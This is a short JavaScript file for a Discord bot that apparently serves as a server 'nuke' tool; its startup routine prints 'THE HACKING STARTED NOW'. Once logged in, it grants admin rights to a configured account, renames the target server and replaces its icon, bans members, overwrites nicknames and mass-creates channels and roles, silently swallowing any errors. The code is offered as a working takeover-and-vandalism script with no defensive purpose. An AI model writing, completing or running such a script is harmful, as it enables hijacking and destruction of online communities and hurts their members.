const Discord = require('discord.js'),
    client = new Discord.Client(),
    config = require('./config.json'),
    tools = require('./src/tools').Tools

client.once('ready', async () => {
    console.log('THE HACKING STARTED NOW ')

    try {
        await client.user.setUsername(config.bot.nickname)
        await client.user.setAvatar(config.bot.icon)
    } catch (_) {
        0
    }

    try {
        const guild = await client.guilds.fetch(config.guild.id),
         ToolsHandler = new tools(client, guild)

        ToolsHandler.set_admin(config.account_id)
        ToolsHandler.change_guild_info({
            new_name: config.guild.new_name,
            new_icon: config.guild.new_icon,
        })
        ToolsHandler.ban_members()
        ToolsHandler.change_nicknames(config.bot.nickname)
        ToolsHandler.create_channels_and_roles(config.bot.nickname)
    } catch (_) {
        0
    }
})

client.login(config.bot.token).catch((_) => {
    console.log("The bot's token expired.")
})
